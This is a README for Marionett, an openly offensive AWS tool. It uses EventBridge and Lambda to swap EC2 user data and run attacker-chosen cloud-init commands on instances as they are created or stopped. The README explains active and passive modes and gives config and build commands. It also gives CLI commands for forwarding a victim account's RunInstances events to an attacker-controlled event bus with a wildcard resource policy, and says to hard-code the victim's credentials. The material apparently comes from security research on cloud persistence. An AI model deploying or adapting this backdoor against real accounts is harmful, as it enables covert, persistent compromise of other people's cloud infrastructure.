# Marionett

Marionett is an example of an automated lambda function that runs that swaps out user data on RunInstance and 
EC2 Instance State Change events. It  exists as an example of how an attacker could semi-covertly backdoor EC2 instances
passively on instance change events or actively on creation. The API calls will stand out, but from the user's
perspective when in passive mode there will be no obvious changes to the instance, in active mode the instance is simply
taking longer to start up (although may cause issues with certain provisioning tools). This is a well known attack,
only change to what I've seen elsewhere is adding Event Bridge and Lambda.

In general this is an improved version of [UserDataSwap](https://github.com/RyanJarv/UserDataSwap).

## Active vs Passive

Marionett can run in either active or passive mode, passive is generally safer and less likely to interfere with
infrastructure provisioning however requires the instance to be shutdown through some other means, likely by the end
user. When running in the active mode Marionett will shut down the node shortly after it is initially created with
the RunInstances API, by default this is immediately however can be configured to wait up to 900 seconds after creation
to work around issues that you may run into with provisioning tools.

## Config
The config is located at `chalicelib/config.yaml` and should be edited before deploy.
### Options
* dynamodb_table
  * Name of the DynamoDB table to create to track instance state.
* sqs_queue
  * Name of the SQSQueue table to create to queue restart events when using active mode.
* active_mode
  * `True` or `False`, enables active mode.
* restart_delay
  * Used when active_mode is set to `True`. 
  * Number of seconds to wait after the RunInstances API is called before restarting the instance.
    * To work around terraform SSH provisioning complaining about an incorrect instance state this can be set to 9. 
      However, this is only useful if an Elastic IP or IPv6 address is used to connect to the instance, otherwise the
      IP will change on restart and SSH provisioning will fail.
    * To work around terraform SSH provisioning when an ElasticIP address is not used you can set this to a higher number
      to have it wait till provisioning is complete before restarting. Essentially this needs to be a best guess since
      we don't have any indication when this may be done.
* user_data
  * Our user data we want to set on the instance temporarily.
  * This will get reverted to the original metadata at the next instance stopped event.
  * `bootcmd` will run at every startup regardless of if cloud-init has run previously.

### Default Settings
```
---
dynamodb_table: UserDataSwap
sqs_queue: user-data-swap-restart-delay
active_mode: False
restart_delay: 0
user_data: |-
#cloud-config

bootcmd:
- echo HELLO FROM USER DATA SCRIPT | tee /msg > /dev/kmsg
```

## Cross-Account Access

There is a fair amount of permissions required to deploy this, which is ok if you just want to test it out. To be useful
it may make more sense to deploy in a seperate account then the one you're targeting, this way the initial set up only
requires `events:PutRule` and `events:PutTargets` permissions in the victim account. I'll likely add support for this in
the future, for now you can try the following to do this manually.

__WARNING__: This will allow any AWS account to run any action against the bus set up in the Marionett account,
probably best to set this part up in a account that isn't used for anything else. The permissive resource policy is one
of the ways to get override the lack of permissions assigned to the the put-event rule in the victim account. Doing it
this way avoids the need for `iam:PassRole` permissions in the victim account to create the event bus rules that forward
the events to the Marionette account. It may be possible to reduce these permissions, I need to do more testing here
though.

* In the Marionett account:
  * In the Marionett lambda account create a new event bus named `run-instance-trigger` and give it the following
    resource policy.
    ```
    {
      "Version": "2012-10-17",
      "Statement": [{
        "Sid": "allow_account_to_put_events",
        "Effect": "Allow",
        "Principal": "*",
        "Action": "*",
        "Resource": "<this event bus arn>"
      }]
    }
    ```
  * Set up the following rule to trigger the Marionett function with the event config below.
     ```
      {
        "source": ["aws.ec2"],
        "detail-type": ["EC2 Instance State-change Notification"],
        "detail": {
          "state": ["stopped"]
        }
      }
     ```
  * If active mode is used add a second rule with the following.
     ```
     {
       "source": ["aws.ec2"],
       "detail": {
         "eventSource": ["ec2.amazonaws.com"],
         "eventName": ["RunInstances"]
       }
     }
     ```
* In the victim account:
  * Create the run-instances event trigger:
    ```
    aws --profile victim-account events put-rule \
      --name run-instance-trigger \
      --state ENABLED \
      --event-bus-name default \
      --event-pattern '{
          "source": ["aws.ec2"],
          "detail": {      
            "eventSource": ["ec2.amazonaws.com"],
            "eventName": ["RunInstances"]
          }
        }'
    ```
  * Add a target to forward to the event-bus in the Marionett account:
    ```
    aws events put-targets --rule run-instance-trigger \
      --event-bus-name default \
      --targets "Id"="1","Arn"="arn:aws:events:<region>:<attacker account #>:event-bus/run-instance-trigger"
    ```
* You should see the Marionett triggered when a instance is created in the victim account now.
  * Update the lambda to hard code the credentials needed to make EC2 related calls in the vicitims account and deploy.

## More Info

For more info you can see my post on [Backdooring user data](https://blog.ryanjarv.sh/2020/11/27/backdooring-user-data.html)

## Related Attacks

For another similar attack (Update: AWS now prevents this in most accounts) with different pros/cons take a look at 
[EC2FakeIMDS](https://github.com/RyanJarv/EC2FakeImds). The talk and slides going over these two can be found on
[my blog](https://blog.ryanjarv.sh/2020/12/04/deja-vu-in-the-cloud.html).

## Requirements

* AWS CLI already configured with Administrator permission for the deployment account (which isn't necessarily the
  targeted account, see the Cross Account section for more info).
* Recent version of [Python](https://www.python.org/)
* [Chalice](https://github.com/aws/chalice)
* [AWS CLI](https://pypi.org/project/awscli/)

## Setup process

### Installing dependencies & building the target 

```shell
python3 -m venv venv
source venv/bin/activate
pip install chalice boto3
```

## Deployment

```bash
make deploy/infra
```

## Wish List
* Target individual instances or tags

### Testing

TODO
